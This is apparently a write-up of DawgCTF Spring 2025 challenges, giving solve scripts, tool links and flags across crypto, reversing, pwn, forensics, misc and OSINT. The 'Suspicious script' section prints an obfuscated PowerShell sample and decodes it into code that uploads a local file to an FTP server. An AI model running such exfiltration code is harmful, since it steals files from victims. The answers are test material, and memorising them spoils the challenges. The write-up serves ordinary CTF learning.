[chall](https://github.com/UMBCCyberDawgs/dawgctf-sp25)  
# Cryptography
## The Birds
![Image](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FBtbZ0%2FbtsNskDX7Ze%2F5G7ytOlPPIyvjCZO3cARmK%2Fimg.png)  
[Birds on a Wire](https://www.dcode.fr/birds-on-a-wire-cipher)

`DawgCTF{THEREISNOESCAPE}`

## baby RSA1
```python
from Crypto.Util.number import *
from sympy import Matrix

e = 0x10001

N = 82012538447359821165849738352756467719053530066892750177578020351019136006996881441650616631012602654920370573185549134046659875914860421394782338722082599261391182262036434549525388081948429632803770833590739702562845306267418403878169267641023564108136843672261999376998284926318313315387819024961709097101
e = 65537
ct = 16978597269030388872549064541934623430749704732655891928833779185083334396093332647023718343748730349576361193985691953617733288330780060179716905267988202710452028943623598185277149645724247199640730959820455032298145782015884558972868277752456856802145299858618876838286795962548300080924547387662096543717

a = 149738867837230590596162146900
b = 743799113257239690478459408953
c = 351498883480247386367558572595
d = 1175770398223262147164171561358

x = 6836728736678282915469852947219518538837808913380425472016857154639492051766923345186030197640091719641785981050969319578519968972834509899732176840511342124020344870655741074618585883
y = 12203451977234755811396526665700561863946871005728263879373008871704520841041885029745864562375412192520795388389509063064717933869698154304534842876137996238014648925041725231457010083

M = Matrix([[a, b], [c, d]])
rhs = Matrix([x, y])

pq = M.inv() * rhs
p, q = [int(val) for val in pq]

assert p * q == N

phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(ct, d, N)

flag = long_to_bytes(m)
print(flag)
```
`DawgCTF{wh0_s41d_m4th_15_us3l3ss?}`

## baby RSA2
```python
from Crypto.Util.number import *
from math import isqrt

e = 58271
d = 16314065939355844497428646964774413938010062495984944007868244761330321449198604198404787327825341236658059256072790190934480082681534717838850610633320375625893501985237981407305284860652632590435055933317638416556532857376955427517397962124909869006289022084571993305966362498048396739334756594170449299859
N = 119082667712915497270407702277886743652985638444637188059938681008077058895935345765407160513555112013190751711213523389194925328565164667817570328474785391992857634832562389502866385475392702847788337877472422435555825872297998602400341624700149407637506713864175123267515579305109471947679940924817268027249
c = 107089582154092285354514758987465112016144455480126366962910414293721965682740674205100222823439150990299989680593179350933020427732386716386685052221680274283469481350106415150660410528574034324184318354089504379956162660478769613136499331243363223860893663583161020156316072996007464894397755058410931262938

kphi = d * e - 1

for k in range(1, 2**20):
    if kphi % k != 0:
        continue
    phi = kphi // k
    a = 1
    b = -(N - phi + 1)
    c_eq = N
    discriminant = b*b - 4*a*c_eq

    if discriminant < 0:
        continue

    sqrt_disc = isqrt(discriminant)
    if sqrt_disc * sqrt_disc != discriminant:
        continue

    p = (-b + sqrt_disc) // 2
    q = (-b - sqrt_disc) // 2

    if p * q == N:
        print("[*] Success: Found p, q")
        phi = (p - 1)*(q - 1)
        d_priv = inverse(0x10001, phi)
        m = pow(c, d_priv, N)
        print(long_to_bytes(m))
        break
```
`DawgCTF{kn0w1ng_d_1s_kn0w1ng_f4ct0rs}`

## Cantor's Pairadox
```python
from math import isqrt, floor

def getTriRoot(z):
    w = floor((-1 + isqrt(1 + 8 * z)) // 2)
    return int(w)

def unpair(z):
    w = getTriRoot(z)
    t = w * (w + 1) // 2
    b = z - t
    a = w - b
    return (a, b)

def unpair_array(arr):
    result = []
    for val in arr:
        a, b = unpair(val)
        result.extend([a, b])
    return result

encoded = [4036872197130975885183239290191447112180924008343518098638033545535893348884348262766810360707383741794721392226291497314826201270847784737584016]

temp = encoded
for i in range(6):
    temp = unpair_array(temp)

while temp and temp[-1] == 0:
    temp.pop()

flag = ''.join(chr(x) for x in temp)
print("Decoded flag:", flag)
```
`Dawg{1_pr3f3r_4ppl3s_t0_pa1rs_4nyw2y5}`

# Reverse Engineering
## Suspicious script
```powershell
$6=[SySTEm.tEXt.EnCoDing]::UNicOdE.gEtStRing([coNVerT]::FrOmbaSe64stRIng('JAB7ACEAfQA9AFsAQwBIAGEAcgBdADEAMAA1ADsAJABhAD0AWwBTAHkAUwBUAEUAbQAuAHQARQBYAHQALgBFAG4AQwBvAEQAaQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQARQAuAGcARQB0AFMAdABSAGkAbgBnACgAWwBjAG8ATgBWAGUAcgBUAF0AOgA6AEYAcgBPAG0AYgBhAHMAZQA2ADQAcwB0AFIASQBuAGcAKAAnAGYAUQBCADAAQQBHAGsAQQBlAEEAQgBsAEEASABzAEEAYQBBAEIAagBBAEgAUQBBAFkAUQBCAGoAQQBIADAAQQBPAHcAQQBwAEEARQBZAEEASgBBAEEAZwBBAEMAdwBBAGEAUQBCAHkAQQBIAFUAQQBKAEEAQQBvAEEARwBVAEEAYgBBAEIAcABBAEUAWQBBAFoAQQBCAGgAQQBHADgAQQBiAEEAQgB3AEEARgBVAEEATABnAEIAcwBBAEcATQBBAGQAdwBBAGsAQQBEAHMAQQBjAEEAQgAwAEEARwBZAEEASgBBAEEAZwBBAEgAUQBBAGMAdwBCAHAAQQBFAHcAQQBkAEEAQgB1AEEARwBVAEEAYgBRAEIAMQBBAEcAYwBBAGMAZwBCAEIAQQBDADAAQQBJAEEAQgBwAEEASABJAEEAVgBRAEEAdQBBAEcAMABBAFoAUQBCADAAQQBIAE0AQQBlAFEAQgBUAEEAQwBBAEEAWgBRAEIAdABBAEcARQBBAFQAZwBCAGwAQQBIAEEAQQBlAFEAQgBVAEEAQwAwAEEASQBBAEIAMABBAEcATQBBAFoAUQBCAHEAQQBHAEkAQQBUAHcAQQB0AEEASABjAEEAWgBRAEIATwBBAEQAMABBAGEAUQBCAHkAQQBIAFUAQQBKAEEAQQA3AEEASABRAEEAYgBnAEIAbABBAEcAawBBAGIAQQBCAEQAQQBHAEkAQQBaAFEAQgBYAEEAQwA0AEEAZABBAEIAbABBAEUANABBAEwAZwBCAHQAQQBHAFUAQQBkAEEAQgB6AEEASABrAEEAVQB3AEEAZwBBAEcAVQBBAA0ACgBiAFEAQgBoAEEARQA0AEEAWgBRAEIAdwBBAEgAawBBAFYAQQBBAHQAQQBDAEEAQQBkAEEAQgBqAEEARwBVAEEAYQBnAEIAaQBBAEUAOABBAEwAUQBCADMAQQBHAFUAQQBUAGcAQQA5AEEARwB3AEEAWQB3AEIAMwBBAEMAUQBBAE8AdwBBAGkAQQBIAEEAQQBhAFEAQgA2AEEAQwA0AEEAYwB3AEIAegBBAEcARQBBAGMAQQBBAHYAQQBHADQAQQBhAFEAQQB2AEEASAAwAEEASQBRAEEAMQBBAEgAUQBBAGMAQQBBAHgAQQBHAE0AQQBOAFEAQgBmAEEARwBRAEEAWgBRAEIAdwBBAEgAQQBBAE4AQQBCAHkAQQBGAGMAQQBlAHcAQgBHAEEARgBRAEEAUQB3AEIAbgBBAEgAYwBBAFkAUQBCAEUAQQBFAEEAQQBlAFEAQgB5AEEARwBFAEEAWQB3AEIAegBBAEQAbwBBAGMAZwBCAGwAQQBIAE0AQQBkAFEAQQB2AEEAQwA4AEEATwBnAEIAdwBBAEgAUQBBAFoAZwBBAGkAQQBEADAAQQBjAEEAQgAwAEEARwBZAEEASgBBAEEANwBBAEQAWQBBAE0AUQBBAHgAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE0AQQBBAHkAQQBEAEUAQQBYAFEAQgB5AEEARwBFAEEAUwBBAEIARABBAEYAcwBBAEsAdwBBADIAQQBEAEUAQQBNAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAFkAQQANAAoATgBBAEIAZABBAEgASQBBAFkAUQBCAEkAQQBFAE0AQQBXAHcAQQByAEEARABVAEEATQBnAEEAeABBAEYAMABBAGMAZwBCAGgAQQBFAGcAQQBRAHcAQgBiAEEAQwBzAEEATgBnAEEAeABBAEQARQBBAFgAUQBCAHkAQQBHAEUAQQBTAEEAQgBEAEEARgBzAEEASwB3AEEAeQBBAEQARQBBAE0AUQBCAGQAQQBIAEkAQQBZAFEAQgBJAEEARQBNAEEAVwB3AEEAcgBBAEQAawBBAE4AQQBCAGQAQQBIAEkAQQBZAFEAQgBJAEEARQBNAEEAVwB3AEEAcgBBAEQAUQBBAE0AUQBBAHgAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE8AUQBBADUAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE0AdwBBADEAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE4AUQBBADUAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE4AUQBBAHgAQQBEAEUAQQBYAFEAQgB5AEEARwBFAEEAUwBBAEIARABBAEYAcwBBAEsAdwBBAHkAQQBEAEUAQQBNAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAFUAQQBPAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAEEAQQBNAEEAQQB4AEEARgAwAEEADQAKAGMAZwBCAGgAQQBFAGcAQQBRAHcAQgBiAEEAQwBzAEEATQBRAEEAMQBBAEYAMABBAGMAZwBCAGgAQQBFAGcAQQBRAHcAQgBiAEEAQwBzAEEATQBBAEEAdwBBAEQARQBBAFgAUQBCAHkAQQBHAEUAQQBTAEEAQgBEAEEARgBzAEEASwB3AEEANABBAEQAUQBBAFgAUQBCAHkAQQBHAEUAQQBTAEEAQgBEAEEARgBzAEEASwB3AEEANQBBAEQAawBBAFgAUQBCAHkAQQBHAEUAQQBTAEEAQgBEAEEARgBzAEEASwB3AEEAdwBBAEQARQBBAE0AUQBCAGQAQQBIAEkAQQBZAFEAQgBJAEEARQBNAEEAVwB3AEEAcgBBAEQARQBBAE4AUQBCAGQAQQBIAEkAQQBZAFEAQgBJAEEARQBNAEEAVwB3AEEAcgBBAEQATQBBAE0AZwBBAHgAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE4AUQBBAHgAQQBEAEUAQQBYAFEAQgB5AEEARwBFAEEAUwBBAEIARABBAEYAcwBBAEsAdwBBADUAQQBEAEUAQQBNAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAGMAQQBPAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAEEAQQBPAEEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAEkAQQBPAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAA0ACgBXAHcAQQByAEEARABnAEEATgBRAEIAZABBAEgASQBBAFkAUQBCAEkAQQBFAE0AQQBXAHcAQQByAEEARABjAEEATgBnAEIAZABBAEgASQBBAFkAUQBCAEkAQQBFAE0AQQBXAHcAQQA5AEEARQBZAEEASgBBAEIANwBBAEgAawBBAGMAZwBCADAAQQBBAD0APQAnACkAKQA7ACQAewBAAH0AIAA9ACIAeAAiADsAJABiAD0AJABhAC4AVABvAEMAaABhAHIAQQByAHIAYQB5ACgAKQA7AFsAYQByAFIAYQBZAF0AOgA6AHIARQBWAGUAcgBTAGUAKAAkAGIAKQA7ACgAJABiACAALQBKAG8ASQBuACAAIgAiACkAIAB8ACAAJgAoACIAJAB7ACEAfQBlACQAewBAAH0AIgApAA=='))
& ([char]105+[char]101+[char]120) $6
```
base64 decode  
```powershell
${!}=[CHar]105;$a=[SySTEm.tEXt.EnCoDing]::UNicOdE.gEtStRing([coNVerT]::FrOmbase64stRIng('fQB0AGkAeABlAHsAaABjAHQAYQBjAH0AOwApAEYAJAAgACwAaQByAHUAJAAoAGUAbABpAEYAZABhAG8AbABwAFUALgBsAGMAdwAkADsAcAB0AGYAJAAgAHQAcwBpAEwAdABuAGUAbQB1AGcAcgBBAC0AIABpAHIAVQAuAG0AZQB0AHMAeQBTACAAZQBtAGEATgBlAHAAeQBUAC0AIAB0AGMAZQBqAGIATwAtAHcAZQBOAD0AaQByAHUAJAA7AHQAbgBlAGkAbABDAGIAZQBXAC4AdABlAE4ALgBtAGUAdABzAHkAUwAgAGUA
bQBhAE4AZQBwAHkAVAAtACAAdABjAGUAagBiAE8ALQB3AGUATgA9AGwAYwB3ACQAOwAiAHAAaQB6AC4AcwBzAGEAcAAvAG4AaQAvAH0AIQA1AHQAcAAxAGMANQBfAGQAZQBwAHAANAByAFcAewBGAFQAQwBnAHcAYQBEAEAAeQByAGEAYwBzADoAcgBlAHMAdQAvAC8AOgBwAHQAZgAiAD0AcAB0AGYAJAA7ADYAMQAxAF0AcgBhAEgAQwBbACsAMAAyADEAXQByAGEASABDAFsAKwA2ADEAMQBdAHIAYQBIAEMAWwArADYA
NABdAHIAYQBIAEMAWwArADUAMgAxAF0AcgBhAEgAQwBbACsANgAxADEAXQByAGEASABDAFsAKwAyADEAMQBdAHIAYQBIAEMAWwArADkANABdAHIAYQBIAEMAWwArADQAMQAxAF0AcgBhAEgAQwBbACsAOQA5AF0AcgBhAEgAQwBbACsAMwA1AF0AcgBhAEgAQwBbACsANQA5AF0AcgBhAEgAQwBbACsANQAxADEAXQByAGEASABDAFsAKwAyADEAMQBdAHIAYQBIAEMAWwArADUAOQBdAHIAYQBIAEMAWwArADAAMAAxAF0A
cgBhAEgAQwBbACsAMQA1AF0AcgBhAEgAQwBbACsAMAAwADEAXQByAGEASABDAFsAKwA4ADQAXQByAGEASABDAFsAKwA5ADkAXQByAGEASABDAFsAKwAwADEAMQBdAHIAYQBIAEMAWwArADEANQBdAHIAYQBIAEMAWwArADMAMgAxAF0AcgBhAEgAQwBbACsANQAxADEAXQByAGEASABDAFsAKwA5ADEAMQBdAHIAYQBIAEMAWwArADcAOQBdAHIAYQBIAEMAWwArADAAOABdAHIAYQBIAEMAWwArADIAOQBdAHIAYQBIAEMA
WwArADgANQBdAHIAYQBIAEMAWwArADcANgBdAHIAYQBIAEMAWwA9AEYAJAB7AHkAcgB0AA=='));${@} ="x";$b=$a.ToCharArray();[arRaY]::rEVerSe($b);($b -JoIn "") | &("${!}e${@}")
```
base64 decode and reverse
```powershell
}tixe{hctac};)F$ ,iru$(eliFdaolpU.lcw$;ptf$ tsiLtnemugrA- irU.metsyS emaNepyT- tcejbO-weN=iru$;tneilCbeW.teN.metsyS emaNepyT- tcejbO-weN=lcw$;"piz.ssap/ni/}!5tp1c5_depp4rW{FTCgwaD@yracs:resu//:ptf"=ptf$;611]raHC[+021]raHC[+611]raHC[+64]raHC[+521]raHC[+611]raHC[+211]raHC[+94]raHC[+411]raHC[+99]raHC[+35]raHC[+59]raHC[+511]raHC[+211]raHC[+59]raHC[+001]raHC[+15]raHC[+001]raHC[+84]raHC[+99]raHC[+011]raHC[+15]raHC[+321]raHC[+511]raHC[+911]raHC[+79]raHC[+08]raHC[+29]raHC[+85]raHC[+76]raHC[=F${yrt


try{$F=[CHar]67+[CHar]58+[CHar]92+[CHar]80+[CHar]97+[CHar]119+[CHar]115+[CHar]123+[CHar]51+[CHar]110+[CHar]99+[CHar]48+[CHar]100+[CHar]51+[CHar]100+[CHar]95+[CHar]112+[CHar]115+[CHar]95+[CHar]53+[CHar]99+[CHar]114+[CHar]49+[CHar]112+[CHar]116+[CHar]125+[CHar]46+[CHar]116+[CHar]120+[CHar]116;$ftp="ftp://user:scary@DawgCTF{Wr4pped_5c1pt5!}/in/pass.zip";$wcl=New-Object -TypeName System.Net.WebClient;$uri=New-Object -TypeName System.Uri -ArgumentList $ftp;$wcl.UploadFile($uri, $F);}catch{exit}
```
`DawgCTF{Wr4pped_5c1pt5!}`

## ShinyClean™ Rust Remover: Budget Edition
```c++
int __fastcall main(int argc, const char **argv, const char **envp)
{
  return std::rt::lang_start::h91ff47afc442db24(shinyclean::main::h4b15dd54e331d693, argc, argv, 0LL);
}
```
C++ Binary
```c++
__int64 shinyclean::main::h4b15dd54e331d693()
{
  __int64 v1; // [rsp+8h] [rbp-100h]
  _BYTE s[23]; // [rsp+2Ah] [rbp-DEh] BYREF
  _BYTE v3[22]; // [rsp+41h] [rbp-C7h] BYREF
  _BYTE v4[9]; // [rsp+57h] [rbp-B1h] BYREF
  _BYTE v5[48]; // [rsp+60h] [rbp-A8h] BYREF
  _QWORD v6[4]; // [rsp+90h] [rbp-78h] BYREF
  _BYTE v7[48]; // [rsp+B0h] [rbp-58h] BYREF
  _BYTE *v8; // [rsp+E0h] [rbp-28h]
  void *v9; // [rsp+E8h] [rbp-20h]
  _BYTE *v10; // [rsp+F0h] [rbp-18h]
  void *v11; // [rsp+F8h] [rbp-10h]
  _BYTE *v12; // [rsp+100h] [rbp-8h]

  memset(s, 0, sizeof(s));
  qmemcpy(v3, "{^HX|kyDym", 10);
  v3[10] = 12;
  v3[11] = 12;
  v3[12] = 96;
  v3[13] = 124;
  v3[14] = 11;
  v3[15] = 109;
  v3[16] = 96;
  v3[17] = 104;
  v3[18] = 11;
  v3[19] = 10;
  v3[20] = 119;
  v3[21] = 30;
  strcpy(v4, "B");
  v4[2] = 0;
  *(_WORD *)&v4[3] = 0;
  *(_DWORD *)&v4[5] = 0;
  do
  {
    if ( *(_QWORD *)&v4[1] >= 0x17uLL )
      core::panicking::panic_bounds_check::h8307ccead484a122(*(_QWORD *)&v4[1], 23LL, &off_54578);
    s[*(_QWORD *)&v4[1]] = v3[*(_QWORD *)&v4[1]] ^ 0x3F;
    v1 = *(_QWORD *)&v4[1] + 1LL;
    if ( *(_QWORD *)&v4[1] == -1LL )
      core::panicking::panic_const::panic_const_add_overflow::hf2f4fb688348b3b0(&off_545A8);
    ++*(_QWORD *)&v4[1];
  }
  while ( v1 != 23 );
  if ( (unsigned int)std::process::id::hcbcee05e6d949703() == 29485234 )
  {
    v10 = s;
    v11 = &core::array::_$LT$impl$u20$core..fmt..Debug$u20$for$u20$$u5b$T$u3b$$u20$N$u5d$$GT$::fmt::hf6f6e41e4948d91c;
    v12 = s;
    v8 = s;
    v9 = &core::array::_$LT$impl$u20$core..fmt..Debug$u20$for$u20$$u5b$T$u3b$$u20$N$u5d$$GT$::fmt::hf6f6e41e4948d91c;
    v6[2] = s;
    v6[3] = &core::array::_$LT$impl$u20$core..fmt..Debug$u20$for$u20$$u5b$T$u3b$$u20$N$u5d$$GT$::fmt::hf6f6e41e4948d91c;
    v6[0] = s;
    v6[1] = &core::array::_$LT$impl$u20$core..fmt..Debug$u20$for$u20$$u5b$T$u3b$$u20$N$u5d$$GT$::fmt::hf6f6e41e4948d91c;
    core::fmt::Arguments::new_v1::hfac9ebf3d99d1264(v5, &unk_545C0, v6);
    return std::io::stdio::_print::he7d505d4f02a1803(v5);
  }
  else
  {
    core::fmt::Arguments::new_const::hf72ed85907e377bb(v7, &off_545E0);
    return std::io::stdio::_print::he7d505d4f02a1803(v7);
  }
}
```
decrypting code
```python
encrypted = [
    ord(c) for c in "{^HX|kyDym"
] + [12, 12, 96, 124, 11, 109, 96, 104, 11, 10, 119, 30]

decrypted = ''.join(chr(b ^ 0x3F) for b in encrypted)
print(decrypted)
```  

`DawgCTF{FR33_C4R_W45H!}`


# Pwn
## Interns' Project
```c++
if ( v14[0] == 2 && geteuid() )
  {
    v7 = std::operator<<<std::char_traits<char>>(&std::cout, "Error: Option 2 requires root privileges HAHA", v4);
    std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
  }
  else
  {
    for ( i = 0; i < v10; ++i )
    {
      switch ( v14[i] )
      {
        case 1:
          sayHello();
          break;
        case 2:
          printFlag();
          break;
        case 3:
          login();
          break;
      }
    }
  }
  std::istringstream::~istringstream(v13);
  std::string::~string(v12);
  return v15 - __readfsqword(0x28u);
```
C++ Binary  
Don't check root priviledge after first index   

![Image](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FzJyoi%2FbtsNti53Ak9%2FY29hEpiV1TP7f9AI4vP1Kk%2Fimg.png)  

`DawgCTF{B@d_P3rm1ssi0ns}`

# Fwn
## Keeping on Schedule
![Image](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fb5sZBs%2FbtsNthlKWZ7%2F3zYe9IM8UdzSLD4RLkLRI1%2Fimg.png)
Find flag format with [Registry Explorer](https://ericzimmerman.github.io/#!index.md) 

`DawgCTF{Fwn_W1th_T4sks}`

## Just Packets
![Image](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FrkM1v%2FbtsNsTFErAK%2FDkuthYfmsEyTnZzP4K6dMK%2Fimg.png)
With [Online Analyzer Tool](https://apackets.com), found long string in FTP record  

```plaintext
Once upon a time, in a small, vibrant village nestled between rolling hills and vast forests, a mysterious legend was whispered among the people. The legend spoke of an ancient flag, hidden away for centuries, said to grant immense wisdom and fortune to the one who found it. This flag was not just a piece of fabric; it was a symbol of the village's history and secrets, woven into its very threads.

Year after year, curious adventurers and determined locals set out to find this elusive flag. They scoured ancient texts, deciphered cryptic clues, and embarked on daring expeditions into the unknown parts of the forest. But no matter how hard they searched, the flag remained hidden, as if it was just a figment of their collective imagination.

Among these seekers was a young girl named Elara. Unlike others, Elara was not driven by the promise of wisdom or fortune. She was captivated by the stories and the history that the flag represented. She spent her days poring over old books and listening to the tales of the elders. Her heart was set on finding the flag, not for the glory, but to understand the stories it held within its fibers.

One starlit evening, as Elara sat reading an ancient manuscript, she stumbled upon a line that struck her differently. It read, "The flag you seek is not in this story at all. It'd be a waste of time analysing this text further (seriously)." Puzzled, Elara pondered over these words. She realized that the flag was never meant to be a physical object to be discovered in her story. Instead, maybe it was a metaphor for the village's rich history and the stories that bound its people together.

Elara shared her revelation with the villagers. They gathered around, listening intently as she spoke of the journeys they had undertaken in search of the flag and the bonds they had formed along the way. The stories of their ancestors, their own adventures, and the lessons they learned were the true flag of their village. It was not something to be found but something to be lived and passed down through generations.

From that day on, the villagers no longer sought the flag in the forests or ancient ruins. They found it in their everyday lives, in the stories they shared, and in the legacy they would leave for future generations. The flag was in their heart, in their stories, a text that did not need to be written but to be lived and cherished. And so, the village continued to thrive, rich in tales and wisdom, with the flag forever waving in their collective spirit.
```
Base64 decode, there is a meaningless article
```python
from scapy.all import *

packets = rdpcap("./dawgctf-sp25/Just Packets/traffic.pcap")
for pkt in packets:
    if pkt.haslayer(TCP) and pkt[TCP].flags & 0x20:
        urg_ptr = pkt[TCP].urgptr
        print(f"URG Pointer: {urg_ptr}")

# URG Pointer: 25697
# URG Pointer: 30567
# URG Pointer: 17236
# URG Pointer: 18043
# URG Pointer: 30313
# URG Pointer: 27756
# URG Pointer: 24935
# URG Pointer: 25970
# URG Pointer: 29535
# URG Pointer: 25199
# URG Pointer: 28260
# URG Pointer: 29565
# URG Pointer: 10
```
Chall hint says check URG Pointer  
So, extract URG Pointer from pcap file and get URG Pointers  
```python
urg_pointers = [
    25697, 30567, 17236, 18043, 30313, 27756,
    24935, 25970, 29535, 25199, 28260, 29565, 10
]

result = b''

for val in urg_pointers:
    high = (val >> 8) & 0xFF
    low = val & 0xFF
    result += bytes([high, low])

print(result.decode())
```
`dawgCTF{villagers_bonds}`

# Misc
## Challenge Files?
## Discord Challenge
## Don't Forget About the Hints!
## Don't Touch My Fone
![Image](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FyhBAD%2FbtsNsbgdLHL%2Fsr6fqC78epNEKSeP0mZ6Pk%2Fimg.png)
Use [DTMF Decoder](https://dtmf.netlify.app)

`DawgCTF{4104553500}`

## Mystery Signal I
![Image](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FptStd%2FbtsNrX3C55X%2Fk68qfct72GJ4u1zNwx99cK%2Fimg.png)
Use [Adaptive Morse Decoder](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)

`DawgCTF{LISTENCAREFULLY}`

## Spectral Secrets
![Image](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FlZDxN%2FbtsNr4mH1zx%2FdnAK2kppTaaknnkGEZSOQ1%2Fimg.png)
Use [Audicity](https://www.audacityteam.org)

`DawgCTF{4ud4c17y_my_b310v3d}}`

# OSINT
## Es ist alless in Butter
[Goolge Map](https://maps.app.goo.gl/kEnKf9L9FqdTCdrE6)

`DawgCTF{Kaufland_Berlin-Moabit}`

## GEOSINT - chall1 - Easy
[Google Map](https://maps.app.goo.gl/oPefvB3Xh3oDSr3o6)

`DawgCTF{Im-more-of-a-bama-fan}`

## GEOSINT - chall3 - Easy
[Google Map](https://maps.app.goo.gl/6L5Kp6EMLJv4zhot5)

`DawgCTF{ifsomeoneorders@HappyCamper_KFC_delivery-illgive10000points}`

## GEOSINT - chall4 - Easy
[Google Map](https://maps.app.goo.gl/9nLJwZA5yZNXfHEx9)

`DawgCTF{was_this_actually_easy?}`

## GEOSINT - chall5 - Easy
[Google Map](https://maps.app.goo.gl/bxwMSe89Uqe91AQT9)

`DawgCTF{howmanyofyoujustknewitwasbaltimore?}`

## GEOSINT - chall7 - Medium
[Google Map](https://maps.app.goo.gl/zHkyWRbvuPz5tUgv8)

`DawgCTF{montereybay_itisnot}`

## GEOSINT - chall8 - Medium
[Google Map](https://maps.app.goo.gl/s6KwNbhbr6PkLuYQ9)

`DawgCTF{goodol’missouray}`

## GEOSINT - chall9 - Medium
[Google Map](https://maps.app.goo.gl/wdiZd6Y72QaYozAB8)

`DawgCTF{UwUitsaflag}`

## GEOSINT - chall11 - Hard
[Google Map](https://maps.app.goo.gl/GmEyc3vTaWzndeyCA)

`DawgCTF{looksatthepenguinz!}`

## GEOSINT - chall12 - Hard
[Google Map](https://maps.app.goo.gl/pxw7PbwdmTYtmpDS8)

`DawgCTF{t.r.a.i.n.s}`